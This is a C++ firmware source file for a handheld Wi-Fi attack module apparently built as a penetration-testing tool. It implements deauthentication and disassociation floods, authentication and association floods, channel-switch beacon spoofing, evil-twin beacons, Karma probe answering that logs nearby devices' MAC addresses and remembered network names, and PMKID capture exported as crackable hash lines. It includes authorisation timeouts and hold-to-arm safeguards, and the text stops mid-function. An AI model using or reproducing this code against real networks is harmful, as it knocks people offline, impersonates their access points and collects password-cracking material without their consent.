#include "wifi_attack.h"

#include <M5Cardputer.h>
#include <SD.h>
#include <WiFi.h>
#include <esp_wifi.h>

#include <cstdio>
#include <cstring>

#include "app/recorder.h"
#include "app/theme.h"
#include "app/ui.h"
#include "dot11/eapol.h"
#include "dot11/hashline.h"
#include "hal/board.h"
#include "hal/lora_radio.h"
#include "hal/rawtx.h"

namespace orthrus::modules {

using namespace orthrus::theme;
namespace bd  = orthrus::board;
namespace d11 = orthrus::dot11;
namespace atk = orthrus::attack;

namespace {

constexpr uint32_t kRedrawMs  = 160;
constexpr uint32_t kScanGuard = 15000;

constexpr int kBodyTop = 21;
constexpr int kRowH    = 14;
constexpr int kRows    = 6;

constexpr char kKeyUp    = ';';
constexpr char kKeyDown  = '.';
constexpr char kKeyBack  = '`';
constexpr char kKeyArm   = 'a';
constexpr char kKeyStop  = 'x';
constexpr char kKeyWiden = 'w';
constexpr char kKeySave  = 's';

// The Wi-Fi families, in the order the picker shows them: what an operator
// came to do, grouped, rather than the enum's order.
constexpr atk::Family kWifiFamilies[] = {
    atk::Family::Deauth,
    atk::Family::Disassoc,
    atk::Family::AuthFlood,
    atk::Family::AssocFlood,
    atk::Family::ChannelSwitch,
    atk::Family::Pmkid,
    atk::Family::TwinBeacon,
    atk::Family::Karma,
    atk::Family::Beacon,
};
constexpr int kWifiFamilyCount =
    static_cast<int>(sizeof(kWifiFamilies) / sizeof(kWifiFamilies[0]));

const uint8_t kBroadcast[d11::kMacLen] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// ---- the receiver -----------------------------------------------------------
//
// Used for three different things, which is why it is one callback with a mode
// rather than three: watching for clients coming back after a disruptive run,
// collecting probe requests for Karma, and catching the EAPOL M1 a PMKID
// solicitation provokes.
//
// IT IS NEVER TURNED OFF DURING A RUN. Basanos shipped a deauth that called
// its own sniffer-stop on the way in: the capture armed, the frames went out,
// the client reconnected, and nothing was listening. Promiscuous mode and
// transmission coexist on this radio, so there is no reason to choose.

volatile bool g_rx = false;
uint8_t       g_bssid[d11::kMacLen] = {0};

volatile uint32_t g_assocResp = 0;
volatile uint32_t g_eapol     = 0;

// Probe requests, for Karma. A tiny ring: the point is to answer the names
// being asked for, not to keep a census.
struct ProbeReq {
    char    ssid[d11::kSsidBuf] = {0};
    uint8_t sta[d11::kMacLen]   = {0};
};
constexpr uint8_t kProbeRing = 8;
ProbeReq          g_probes[kProbeRing];
volatile uint8_t  g_probeHead = 0;   // next slot to write
volatile uint8_t  g_probeTail = 0;   // next slot to read
volatile uint32_t g_probeSeen = 0;

// The M1 a PMKID solicitation provokes. Copied out of the callback rather than
// parsed in it: extractPmkid walks key data, and the callback runs inside the
// Wi-Fi driver.
uint8_t           g_m1[256]  = {0};
volatile uint16_t g_m1Len    = 0;
uint8_t           g_m1Sta[d11::kMacLen] = {0};

void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!g_rx || buf == nullptr) return;
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    const auto* pkt = static_cast<const wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* frame = pkt->payload;
    const uint16_t len   = pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    d11::FrameInfo fi;
    if (!d11::parseHeader(frame, len, fi)) return;

    if (fi.type == d11::FrameType::Management) {
        // A probe request is addressed to nobody in particular, so it is the
        // one management frame NOT filtered by BSSID: the whole point of Karma
        // is hearing names nothing in this room is advertising.
        if (fi.subtype == d11::kSubtypeProbeReq) {
            // A probe request's body is tagged parameters with no fixed
            // fields, so the beacon parser's 12-byte prologue does not apply.
            // The SSID element is first, which is all that is wanted here.
            const uint8_t* body = frame + fi.headerLen;
            if (len <= fi.headerLen + 2) return;
            const size_t bodyLen = len - fi.headerLen;
            if (body[0] != 0x00) return;              // not an SSID element
            const uint8_t sl = body[1];
            if (sl == 0 || sl > d11::kSsidMax) return; // a wildcard probe
            if (static_cast<size_t>(2) + sl > bodyLen) return;

            g_probeSeen++;
            const uint8_t next = static_cast<uint8_t>((g_probeHead + 1) % kProbeRing);
            if (next == g_probeTail) return;          // ring full: drop, do not block
            ProbeReq& p = g_probes[g_probeHead];
            std::memcpy(p.ssid, body + 2, sl);
            p.ssid[sl] = '\0';
            for (uint8_t k = 0; k < sl; k++) {
                const unsigned char c = static_cast<unsigned char>(p.ssid[k]);
                if (c < 0x20 || c == 0x7F) p.ssid[k] = ' ';
            }
            std::memcpy(p.sta, fi.addr2, d11::kMacLen);
            g_probeHead = next;
            return;
        }

        if (!d11::macEqual(fi.addr3, g_bssid)) return;
        if (fi.subtype == d11::kSubtypeAssocResp) g_assocResp++;
        return;
    }

    uint8_t bssid[d11::kMacLen], sta[d11::kMacLen];
    if (!d11::resolveEndpoints(fi, bssid, sta)) return;
    if (!d11::macEqual(bssid, g_bssid)) return;

    const uint8_t* payload = nullptr;
    size_t payloadLen = 0;
    if (!d11::eapolPayload(frame, len, fi, &payload, &payloadLen)) return;
    g_eapol++;

    // Keep the first EAPOL frame of the exchange for the PMKID walk. Only the
    // first: a later message would overwrite an M1 that already carried one.
    if (g_m1Len == 0 && payloadLen > 0 && payloadLen <= sizeof(g_m1)) {
        std::memcpy(g_m1, payload, payloadLen);
        std::memcpy(g_m1Sta, sta, d11::kMacLen);
        g_m1Len = static_cast<uint16_t>(payloadLen);
    }
}

void startRx(const uint8_t bssid[d11::kMacLen]) {
    std::memcpy(g_bssid, bssid, d11::kMacLen);
    g_assocResp = g_eapol = g_probeSeen = 0;
    g_probeHead = g_probeTail = 0;
    g_m1Len = 0;

    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
    esp_wifi_set_promiscuous(true);
    g_rx = true;
}

void stopRx() {
    g_rx = false;
    esp_wifi_set_promiscuous(false);
}

bool popProbe(ProbeReq& out) {
    if (g_probeTail == g_probeHead) return false;
    out = g_probes[g_probeTail];
    g_probeTail = static_cast<uint8_t>((g_probeTail + 1) % kProbeRing);
    return true;
}

void signalBars(int x, int y, int8_t rssi, uint16_t colour) {
    auto& d = ui::gfx();
    int bars = 1;
    if (rssi > -60)      bars = 4;
    else if (rssi > -70) bars = 3;
    else if (rssi > -80) bars = 2;
    for (int i = 0; i < 4; i++) {
        const int h = 2 + i * 2;
        d.fillRect(x + i * 3, y - h, 2, h, i < bars ? colour : kFaint);
    }
}

uint16_t klassColour(atk::Klass k) {
    switch (k) {
        case atk::Klass::Disruptive: return kCritical;
        case atk::Klass::Active:     return kMedium;
        case atk::Klass::Benign:     return kLow;
    }
    return kMuted;
}

}  // namespace

// ---- lifecycle --------------------------------------------------------------

bool WifiAttack::begin() {
    view_ = View::Networks;

    if (!hal::rawTxAvailable()) {
        // Refuse to arm rather than transmit into a void and count up to
        // nothing. See hal/rawtx.h: this has happened, and on screen it looked
        // exactly like a properly protected network.
        view_ = View::Unavailable;
        return true;
    }

    if (!hal::rawTxBegin(1)) {
        view_ = View::Unavailable;
        return true;
    }

    // The domain starts at its narrowest. A locked target may widen it, with
    // the operator told every time.
    atk::regionSet(atk::Region::Fcc);

    startScan();
    return true;
}

void WifiAttack::startScan() {
    count_    = 0;
    selected_ = 0;
    scroll_   = 0;
    stopRx();
    WiFi.scanDelete();
    WiFi.scanNetworks(true, true);
    scanning_    = true;
    scanStarted_ = millis();
}

void WifiAttack::collectScan() {
    const int16_t n = WiFi.scanComplete();
    if (n == WIFI_SCAN_RUNNING) {
        if (millis() - scanStarted_ > kScanGuard) {
            WiFi.scanDelete();
            scanning_ = false;
        }
        return;
    }
    if (n < 0) { scanning_ = false; return; }

    count_ = 0;
    for (int16_t i = 0; i < n && count_ < kMaxNetworks; i++) {
        Network& net = nets_[count_];
        const String ssid = WiFi.SSID(i);
        std::strncpy(net.ssid, ssid.c_str(), sizeof(net.ssid) - 1);
        net.ssid[sizeof(net.ssid) - 1] = '\0';

        const uint8_t* b = WiFi.BSSID(i);
        if (b) std::memcpy(net.bssid, b, d11::kMacLen);
        net.channel = static_cast<uint8_t>(WiFi.channel(i));
        net.rssi    = static_cast<int8_t>(WiFi.RSSI(i));
        net.secured = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;
        count_++;
    }
    WiFi.scanDelete();
    scanning_ = false;
}

bool WifiAttack::lockSelected() {
    if (count_ == 0) return false;
    const Network& n = nets_[selected_];

    // A network is evidence about its own domain: an access point on channel 13
    // is not operating under a plan that stops at 11. The clamp widens for the
    // target and the operator is told, because this can put the radio on a
    // channel their own regulator does not permit.
    widenedRegion_ = atk::regionWidenFor(n.channel);

    return atk::lock(auth_, n.ssid, n.bssid, n.channel, millis(), kAuthTtlMs);
}

void WifiAttack::enterFamilies() {
    family_       = 0;
    familyScroll_ = 0;
    view_         = View::Families;
}

void WifiAttack::enterArm() {
    atk::planDefault(plan_, kWifiFamilies[family_]);
    planError_ = atk::validate(plan_, auth_, millis());
    holding_   = false;
    holdStart_ = 0;
    view_      = View::Arm;
}

bool WifiAttack::armIfHeld() {
    // Held, not tapped. A slip of the thumb should not deauthenticate a floor.
    const bool down = M5Cardputer.Keyboard.isPressed() &&
                      M5Cardputer.Keyboard.isKeyPressed(kKeyArm);
    if (!down) { holding_ = false; return false; }

    if (!holding_) {
        holding_   = true;
        holdStart_ = millis();
        return false;
    }
    return (millis() - holdStart_) >= kArmHoldMs;
}

void WifiAttack::startRun() {
    // Re-validated at the moment of arming, not at the moment of selection. The
    // authorisation may have expired while the operator read the screen.
    planError_ = atk::validate(plan_, auth_, millis());
    if (planError_ != atk::PlanError::Ok) return;

    framesSent_   = 0;
    framesFailed_ = 0;
    reconnects_   = 0;
    eapolSeen_    = 0;
    probesSeen_   = 0;
    answered_     = 0;
    pmkidSaved_   = false;
    pmkidTarget_  = d11::Target{};
    csaCountdown_ = 3;
    seq_.reset();

    const uint8_t ch = plan_.channel != 0 ? plan_.channel : auth_.channel;
    hal::rawTxSetChannel(ch);

    // The channel clients are being sent to: as far from the real one as the
    // domain allows, so a client that obeys genuinely loses the network.
    csaTarget_ = ch > 6 ? 1 : atk::regionMaxChannel();

    // Listening starts BEFORE transmitting and stays on throughout.
    startRx(auth_.bssid);

    runStart_   = millis();
    lastTickMs_ = runStart_;
    watching_   = false;
    view_       = View::Running;
}

// ---- the radio --------------------------------------------------------------

uint32_t WifiAttack::emitBeacons(uint16_t want) {
    uint32_t sent = 0;
    for (uint16_t i = 0; i < want; i++) {
        const uint8_t idx = static_cast<uint8_t>((framesSent_ + i) % kInventedAps);

        char name[d11::kSsidBuf];
        std::snprintf(name, sizeof(name), ORTHRUS_TEST_PREFIX "%02u",
                      static_cast<unsigned>(idx + 1));

        uint8_t bssid[d11::kMacLen];
        d11::inventedAddress(bssid, idx + 1);

        uint8_t frame[d11::kInjectMax];
        const size_t len = d11::buildBeacon(frame, sizeof(frame), name, bssid,
                                            plan_.channel ? plan_.channel
                                                          : auth_.channel,
                                            d11::BeaconSecurity::Wpa2Psk, seq_);
        if (len && hal::rawTxSend(frame, len)) sent++;
        else framesFailed_++;
        delay(1);
    }
    return sent;
}

uint32_t WifiAttack::emitTwin(uint16_t want) {
    // The target's own name and BSSID, with the security class DELIBERATELY
    // wrong: a secured network twinned as open, an open one twinned as WPA2. A
    // client that cannot tell this from the real access point is the finding.
    const d11::BeaconSecurity sec = nets_[selected_].secured
                                        ? d11::BeaconSecurity::Open
                                        : d11::BeaconSecurity::Wpa2Psk;
    uint32_t sent = 0;
    for (uint16_t i = 0; i < want; i++) {
        uint8_t frame[d11::kInjectMax];
        const size_t len = d11::buildBeacon(frame, sizeof(frame), auth_.ssid,
                                            auth_.bssid, auth_.channel, sec, seq_);
        if (len && hal::rawTxSend(frame, len)) sent++;
        else framesFailed_++;
        delay(1);
    }
    return sent;
}

uint32_t WifiAttack::emitKarma(uint16_t want) {
    // Answer the names being asked for, from an invented BSSID, and log who
    // asked. Never a portal and never a password prompt: the finding is "your
    // devices still trust this name", which needs no harvesting.
    probesSeen_ = g_probeSeen;

    uint32_t sent = 0;
    ProbeReq p;
    while (sent < want && popProbe(p)) {
        uint8_t bssid[d11::kMacLen];
        d11::inventedAddress(bssid, static_cast<uint32_t>(p.sta[5]) + 1u);

        uint8_t frame[d11::kInjectMax];
        const size_t len = d11::buildProbeResponse(
            frame, sizeof(frame), p.ssid, bssid, p.sta,
            plan_.channel ? plan_.channel : auth_.channel,
            d11::BeaconSecurity::Open, seq_);
        if (len && hal::rawTxSend(frame, len)) {
            sent++;
            answered_++;
            char detail[112];
            std::snprintf(detail, sizeof(detail),
                          "karma probe ssid=\"%s\" sta=%02X:%02X:%02X:%02X:%02X:%02X",
                          p.ssid, p.sta[0], p.sta[1], p.sta[2], p.sta[3], p.sta[4],
                          p.sta[5]);
            app::recorder().noteDevice(detail);
        } else {
            framesFailed_++;
        }
        delay(1);
    }
    return sent;
}

uint32_t WifiAttack::emitPmkid(uint16_t want) {
    // Authenticate, then associate. The access point answers an association
    // with EAPOL message 1, and some of them put a PMKID in it -- which is
    // offline-attackable with no client ever involved.
    uint32_t sent = 0;
    uint8_t  src[d11::kMacLen];
    d11::inventedAddress(src, 0xA7);

    for (uint16_t i = 0; i < want; i++) {
        uint8_t frame[d11::kInjectMax];
        size_t len = d11::buildAuthRequest(frame, sizeof(frame), auth_.bssid, src, seq_);
        if (len && hal::rawTxSend(frame, len)) sent++; else framesFailed_++;
        delay(30);

        len = d11::buildAssocRequest(frame, sizeof(frame), auth_.ssid, auth_.bssid,
                                     src, seq_);
        if (len && hal::rawTxSend(frame, len)) sent++; else framesFailed_++;
        delay(60);
    }

    // Walk whatever came back, out here rather than in the driver callback.
    if (g_m1Len > 0 && !pmkidTarget_.havePmkid) {
        d11::KeyFrame kf;
        if (d11::parseKeyFrame(g_m1, g_m1Len, kf)) {
            uint8_t pmkid[d11::kPmkidLen];
            if (d11::extractPmkid(kf, pmkid)) {
                std::memcpy(pmkidTarget_.pmkid, pmkid, d11::kPmkidLen);
                pmkidTarget_.havePmkid = true;
                std::memcpy(pmkidTarget_.bssid, auth_.bssid, d11::kMacLen);
                std::memcpy(pmkidTarget_.sta, src, d11::kMacLen);
                std::strncpy(pmkidTarget_.ssid, auth_.ssid,
                             sizeof(pmkidTarget_.ssid) - 1);
                pmkidTarget_.channel = auth_.channel;
            }
        }
    }
    return sent;
}

uint32_t WifiAttack::emitDisconnect(uint16_t want, bool disassoc) {
    // BOTH DIRECTIONS, AND TO THE CLIENTS RATHER THAN ONLY THE BROADCAST.
    //
    // Basanos shipped a version that, with no station named, addressed the
    // frame to the access point itself: real frames, zero disconnections, and a
    // result line saying it worked. And a broadcast deauthentication alone is
    // routinely ignored -- plenty of stacks only honour one addressed to them.
    //
    // So: the broadcast, and then the named client in both directions when
    // there is one. A disconnect is only honoured in the direction it
    // plausibly travels, and equipment differs over which it obeys.
    uint8_t dest[d11::kMacLen];
    atk::destinationFor(auth_, dest);

    const uint16_t reason = plan_.reasonCode;
    uint32_t sent = 0;

    for (uint16_t i = 0; i < want; i++) {
        uint8_t frame[d11::kInjectMax];
        size_t len;

        // Access point -> the destination.
        len = disassoc ? d11::buildDisassoc(frame, sizeof(frame), dest, auth_.bssid,
                                            auth_.bssid, reason, seq_)
                       : d11::buildDeauth(frame, sizeof(frame), dest, auth_.bssid,
                                          auth_.bssid, reason, seq_);
        if (len && hal::rawTxSend(frame, len)) sent++; else framesFailed_++;

        if (atk::scopeOf(auth_) == atk::Scope::OneClient) {
            // And the client -> the access point, which some gear honours when
            // it ignores the other direction.
            len = disassoc
                      ? d11::buildDisassoc(frame, sizeof(frame), auth_.bssid,
                                           auth_.client, auth_.bssid, reason, seq_)
                      : d11::buildDeauth(frame, sizeof(frame), auth_.bssid,
                                         auth_.client, auth_.bssid, reason, seq_);
            if (len && hal::rawTxSend(frame, len)) sent++; else framesFailed_++;
        } else {
            // Whole cell: also send one addressed from the broadcast side, so a
            // client that filters on addr1 still sees it.
            len = disassoc ? d11::buildDisassoc(frame, sizeof(frame), kBroadcast,
                                                auth_.bssid, auth_.bssid, reason, seq_)
                           : d11::buildDeauth(frame, sizeof(frame), kBroadcast,
                                              auth_.bssid, auth_.bssid, reason, seq_);
            if (len && hal::rawTxSend(frame, len)) sent++; else framesFailed_++;
        }
        delay(2);
    }
    return sent;
}

uint32_t WifiAttack::emitAuthFlood(uint16_t want) {
    uint32_t sent = 0;
    for (uint16_t i = 0; i < want; i++) {
        uint8_t src[d11::kMacLen];
        d11::inventedAddress(src, framesSent_ + i);
        uint8_t frame[d11::kInjectMax];
        const size_t len = d11::buildAuthRequest(frame, sizeof(frame), auth_.bssid,
                                                 src, seq_);
        if (len && hal::rawTxSend(frame, len)) sent++; else framesFailed_++;
        delay(1);
    }
    return sent;
}

uint32_t WifiAttack::emitAssocFlood(uint16_t want) {
    uint32_t sent = 0;
    for (uint16_t i = 0; i < want; i++) {
        uint8_t src[d11::kMacLen];
        d11::inventedAddress(src, 0x1000u + framesSent_ + i);
        uint8_t frame[d11::kInjectMax];
        const size_t len = d11::buildAssocRequest(frame, sizeof(frame), auth_.ssid,
                                                  auth_.bssid, src, seq_);
        if (len && hal::rawTxSend(frame, len)) sent++; else framesFailed_++;
        delay(2);
    }
    return sent;
}

uint32_t WifiAttack::emitCsa(uint16_t want) {
    uint32_t sent = 0;
    for (uint16_t i = 0; i < want; i++) {
        uint8_t frame[d11::kInjectMax];
        const size_t len = d11::buildCsaBeacon(
            frame, sizeof(frame), auth_.ssid, auth_.bssid, auth_.channel,
            csaTarget_, csaCountdown_,
            nets_[selected_].secured ? d11::BeaconSecurity::Wpa2Psk
                                     : d11::BeaconSecurity::Open,
            seq_);
        if (len && hal::rawTxSend(frame, len)) sent++; else framesFailed_++;

        // Count down to the switch, then start over. A beacon that says "three
        // intervals from now" forever is one a client can keep deferring.
        csaCountdown_ = csaCountdown_ ? static_cast<uint8_t>(csaCountdown_ - 1) : 3;
        delay(2);
    }
    return sent;
}

uint32_t WifiAttack::emitBurst(uint16_t want) {
    switch (plan_.family) {
        case atk::Family::Beacon:        return emitBeacons(want);
        case atk::Family::TwinBeacon:    return emitTwin(want);
        case atk::Family::Karma:         return emitKarma(want);
        case atk::Family::Pmkid:         return emitPmkid(want);
        case atk::Family::Deauth:        return emitDisconnect(want, false);
        case atk::Family::Disassoc:      return emitDisconnect(want, true);
        case atk::Family::AuthFlood:     return emitAuthFlood(want);
        case atk::Family::AssocFlood:    return emitAssocFlood(want);
        case atk::Family::ChannelSwitch: return emitCsa(want);
        default:                         return 0;
    }
}

void WifiAttack::stepRun() {
    if (view_ != View::Running || watching_) return;

    const uint32_t now = millis();

    // THE AUTHORISATION IS RE-CHECKED BEFORE EVERY BURST, not once at the
    // start. That is what makes a continuous run bounded: it ends when the
    // authorisation expires, and the TTL is capped.
    if (!auth_.valid(now)) {
        planError_ = atk::PlanError::AuthorizationExpired;
        finish();
        return;
    }

    if (!plan_.continuous && plan_.seconds != 0 &&
        (now - runStart_) >= static_cast<uint32_t>(plan_.seconds) * 1000u) {
        // Stops on its own. Nothing here runs until the battery dies.
        const atk::Spec* s = atk::spec(plan_.family);
        if (s && s->klass == atk::Klass::Disruptive) {
            watching_   = true;
            watchStart_ = now;
            return;
        }
        finish();
        return;
    }

    // One tick of work per ~100 ms, sized from the plan's rate.
    const uint32_t since = now - lastTickMs_;
    if (since < 100) return;
    lastTickMs_ = now;

    uint32_t want = (static_cast<uint32_t>(plan_.pps) * since) / 1000u;
    if (want == 0) want = 1;
    if (want > 64) want = 64;   // one tick never monopolises the loop

    framesSent_ += emitBurst(static_cast<uint16_t>(want));
    eapolSeen_   = g_eapol;
    reconnects_  = g_assocResp;
    probesSeen_  = g_probeSeen;
}

void WifiAttack::stepWatch() {
    if (!watching_) return;
    eapolSeen_  = g_eapol;
    reconnects_ = g_assocResp;
    if (millis() - watchStart_ >= kWatchMs) finish();
}

bool WifiAttack::savePmkid() {
    if (!pmkidTarget_.havePmkid) return false;
    if (!app::recorder().begin() && !app::recorder().active()) return false;

    hal::beginSharedSpi();
    if (!SD.exists("/orthrus")) SD.mkdir("/orthrus");

    for (int i = 1; i < 999; i++) {
        std::snprintf(pmkidPath_, sizeof(pmkidPath_), "/orthrus/pmkid-%03d.22000", i);
        if (!SD.exists(pmkidPath_)) break;
    }

    char line[d11::kHashLineMax];
    if (d11::writePmkidLine(pmkidTarget_, line, sizeof(line)) == 0) return false;

    File f = SD.open(pmkidPath_, FILE_WRITE);
    if (!f) return false;
    f.println(line);
    f.close();

    char detail[112];
    std::snprintf(detail, sizeof(detail), "pmkid export ssid=\"%s\" file=%s",
                  pmkidTarget_.ssid, pmkidPath_);
    app::recorder().note(evidence::RecordKind::Note, detail);
    pmkidSaved_ = true;
    return true;
}

void WifiAttack::finish() {
    stopRx();
    watching_ = false;

    const atk::Spec* s = atk::spec(plan_.family);
    char bssid[18];
    d11::formatMacColons(auth_.bssid, bssid);

    char detail[192];
    std::snprintf(detail, sizeof(detail),
                  "attack %s ssid=\"%s\" bssid=%s ch=%u scope=%s sent=%u failed=%u "
                  "reassoc=%u eapol=%u probes=%u answered=%u ref=\"%s\"",
                  s ? s->name : "?", auth_.ssid, bssid,
                  static_cast<unsigned>(auth_.channel),
                  atk::scopeName(atk::scopeOf(auth_)),
                  static_cast<unsigned>(framesSent_),
                  static_cast<unsigned>(framesFailed_),
                  static_cast<unsigned>(reconnects_),
                  static_cast<unsigned>(eapolSeen_),
                  static_cast<unsigned>(probesSeen_),
                  static_cast<unsigned>(answered_),
                  auth_.reference);
    app::recorder().noteFinding(detail);

    view_ = View::Result;
}

// ---- screens ----------------------------------------------------------------

void WifiAttack::drawUnavailable() {
    ui::beginFrame();
    auto& d = ui::gfx();
    ui::chrome("Attack");

    d.setFont(kFaceData);
    d.setTextDatum(top_left);
    d.setTextColor(kCritical, kInk);
    d.drawString("Injection unavailable", 8, kHeaderH + 14);

    d.setTextColor(kMuted, kInk);
    ui::wrapText(8, kHeaderH + 30, bd::kScreenW - 16, 10, 5, kMuted,
                 "This build cannot transmit raw management frames. Rather than "
                 "count up to zero frames sent and call it no effect, it refuses "
                 "to arm.");

    ui::footer("any key   back");
    ui::endFrame();
}

void WifiAttack::drawNetworks() {
    ui::beginFrame();
    auto& d = ui::gfx();

    char right[20];
    if (scanning_) std::snprintf(right, sizeof(right), "scanning");
    else std::snprintf(right, sizeof(right), "%u found", static_cast<unsigned>(count_));
    ui::chrome("Pick a target", right);

    if (count_ == 0) {
        d.setFont(kFaceData);
        d.setTextDatum(top_left);
        d.setTextColor(kMuted, kInk);
        d.drawString(scanning_ ? "Listening..." : "No networks heard.", 8,
                     kHeaderH + 18);
        if (!scanning_) {
            d.setTextColor(kFaint, kInk);
            d.drawString("r  scan again", 8, kHeaderH + 34);
        }
        ui::footer("r rescan   ` back");
        ui::endFrame();
        return;
    }

    if (selected_ < scroll_) scroll_ = selected_;
    if (selected_ >= scroll_ + kRows) scroll_ = selected_ - kRows + 1;

    for (int row = 0; row < kRows; row++) {
        const int i = scroll_ + row;
        if (i >= count_) break;
        const Network& n = nets_[i];
        const int y   = kBodyTop + row * kRowH;
        const int mid = y + kRowH / 2;
        const bool sel = (i == selected_);
        const uint16_t bg = sel ? kSurface : kInk;

        ui::listRow(y, kRowH, sel);

        d.setFont(kFaceData);
        d.setTextDatum(middle_left);
        d.setTextColor(sel ? kText : kMuted, bg);
        char name[22];
        std::snprintf(name, sizeof(name), "%-18.18s",
                      n.ssid[0] ? n.ssid : "(hidden)");
        d.drawString(name, 8, mid);

        d.setTextColor(n.secured ? kLow : kCritical, bg);
        d.setTextDatum(middle_right);
        char ch[8];
        std::snprintf(ch, sizeof(ch), "%u", static_cast<unsigned>(n.channel));
        d.drawString(ch, bd::kScreenW - 22, mid);

        signalBars(bd::kScreenW - 18, mid + 4, n.rssi, sel ? kShine : kBrass);
    }

    char detail[64];
    const Network& n = nets_[selected_];
    std::snprintf(detail, sizeof(detail), "ch %u   %d dBm   %s",
                  static_cast<unsigned>(n.channel), static_cast<int>(n.rssi),
                  n.secured ? "secured" : "OPEN");
    ui::detailStrip(107, detail);
    ui::footer("; . pick   enter lock   r rescan");
    d.setTextDatum(top_left);
    ui::endFrame();
}

void WifiAttack::drawFamilies() {
    ui::beginFrame();
    auto& d = ui::gfx();

    char right[24];
    std::snprintf(right, sizeof(right), "%.10s", auth_.ssid);
    ui::chrome("What to do", right);

    if (family_ < familyScroll_) familyScroll_ = family_;
    if (family_ >= familyScroll_ + kRows) familyScroll_ = family_ - kRows + 1;

    atk::Group lastGroup = atk::Group::Count;
    for (int row = 0; row < kRows; row++) {
        const int i = familyScroll_ + row;
        if (i >= kWifiFamilyCount) break;
        const atk::Spec* s = atk::spec(kWifiFamilies[i]);
        if (s == nullptr) continue;

        const int y   = kBodyTop + row * kRowH;
        const int mid = y + kRowH / 2;
        const bool sel = (i == family_);
        const uint16_t bg = sel ? kSurface : kInk;

        ui::listRow(y, kRowH, sel);

        d.setFont(kFaceData);
        d.setTextDatum(middle_left);
        d.setTextColor(sel ? kText : kMuted, bg);
        d.drawString(s->name, 8, mid);

        // The class, as a word and a colour. It is the first thing an operator
        // should read about a row they are about to open.
        d.setTextDatum(middle_right);
        d.setTextColor(klassColour(s->klass), bg);
        d.drawString(s->klass == atk::Klass::Disruptive ? "disrupt"
                     : s->klass == atk::Klass::Active   ? "active"
                                                        : "benign",
                     bd::kScreenW - 6, mid);
        lastGroup = s->group;
    }
    (void)lastGroup;

    const atk::Spec* sel = atk::spec(kWifiFamilies[family_]);
    ui::detailStrip(107, sel ? sel->proves : "");
    ui::footer("; . pick   enter open   ` back");
    d.setTextDatum(top_left);
    ui::endFrame();
}

void WifiAttack::drawArm() {
    ui::beginFrame();
    auto& d = ui::gfx();

    const atk::Spec* s = atk::spec(plan_.family);
    ui::chrome(s ? s->name : "Arm");

    d.setFont(kFaceData);
    d.setTextDatum(top_left);

    // EFFECT FIRST. What this does to the people on that network, before any
    // number. The numbers are all true and none of them say it.
    const int afterEffect =
        ui::wrapText(6, kHeaderH + 4, bd::kScreenW - 12, 9, 4,
                     s && s->klass == atk::Klass::Disruptive ? kCritical : kText,
                     s ? s->effect : "");

    int y = afterEffect + 3;

    char line[56];
    const uint8_t ch = plan_.channel ? plan_.channel : auth_.channel;
    std::snprintf(line, sizeof(line), "%.14s  ch%u  %s", auth_.ssid,
                  static_cast<unsigned>(ch),
                  atk::scopeName(atk::scopeOf(auth_)));
    d.setTextColor(kBrass, kInk);
    d.drawString(line, 6, y);
    y += 10;

    if (planError_ != atk::PlanError::Ok) {
        d.setTextColor(kCritical, kInk);
        d.drawString(atk::planErrorText(planError_), 6, y);
        ui::footer("` back");
        ui::endFrame();
        return;
    }

    const uint32_t budget = atk::frameBudget(plan_);
    if (budget)
        std::snprintf(line, sizeof(line), "%u frames  %u/s  %us",
                      static_cast<unsigned>(budget),
                      static_cast<unsigned>(plan_.pps),
                      static_cast<unsigned>(plan_.seconds));
    else
        std::snprintf(line, sizeof(line), "until stopped  %u/s",
                      static_cast<unsigned>(plan_.pps));
    d.setTextColor(kMuted, kInk);
    d.drawString(line, 6, y);
    y += 10;

    if (widenedRegion_) {
        d.setTextColor(kMedium, kInk);
        std::snprintf(line, sizeof(line), "region widened to %s for this target",
                      atk::regionName(atk::regionGet()));
        d.drawString(line, 6, y);
    }

    // The hold bar.
    const int barY = 118;
    d.drawRect(6, barY, bd::kScreenW - 12, 7, kRule);
    if (holding_) {
        uint32_t held = millis() - holdStart_;
        if (held > kArmHoldMs) held = kArmHoldMs;
        const int w = static_cast<int>((bd::kScreenW - 14) * held / kArmHoldMs);
        d.fillRect(7, barY + 1, w, 5, kShine);
    }

    ui::footer(holding_ ? "hold a ..." : "hold a  2s to arm    ` back");
    ui::endFrame();
}

void WifiAttack::drawRunning() {
    ui::beginFrame();
    auto& d = ui::gfx();

    const atk::Spec* s = atk::spec(plan_.family);
    char right[16];
    const uint32_t elapsed = (millis() - runStart_) / 1000u;
    if (plan_.continuous || plan_.seconds == 0)
        std::snprintf(right, sizeof(right), "%us", static_cast<unsigned>(elapsed));
    else
        std::snprintf(right, sizeof(right), "%u/%us", static_cast<unsigned>(elapsed),
                      static_cast<unsigned>(plan_.seconds));
    ui::chrome(watching_ ? "Listening" : (s ? s->name : "Running"), right);

    d.setFont(kFaceData);
    d.setTextDatum(top_left);

    int y = kHeaderH + 6;
    char line[56];

    d.setTextColor(kText, kInk);
    std::snprintf(line, sizeof(line), "sent %u", static_cast<unsigned>(framesSent_));
    d.drawString(line, 8, y);
    if (framesFailed_) {
        d.setTextColor(kCritical, kInk);
        std::snprintf(line, sizeof(line), "refused %u",
                      static_cast<unsigned>(framesFailed_));
        d.drawString(line, 110, y);
    }
    y += 12;

    // Per-family live detail: the thing this run is actually for.
    d.setTextColor(kBrass, kInk);
    switch (plan_.family) {
        case atk::Family::Karma:
            std::snprintf(line, sizeof(line), "probes %u   answered %u",
                          static_cast<unsigned>(probesSeen_),
                          static_cast<unsigned>(answered_));
            break;
        case atk::Family::Pmkid:
            std::snprintf(line, sizeof(line), "eapol %u   pmkid %s",
                          static_cast<unsigned>(eapolSeen_),
                          pmkidTarget_.havePmkid ? "YES" : "--");
            break;
        default:
            std::snprintf(line, sizeof(line), "reassoc %u   eapol %u",
                          static_cast<unsigned>(reconnects_),
                          static_cast<unsigned>(eapolSeen_));
            break;
    }
    d.drawString(line, 8, y);
    y += 14;

    if (watching_) {
        d.setTextColor(kMuted, kInk);
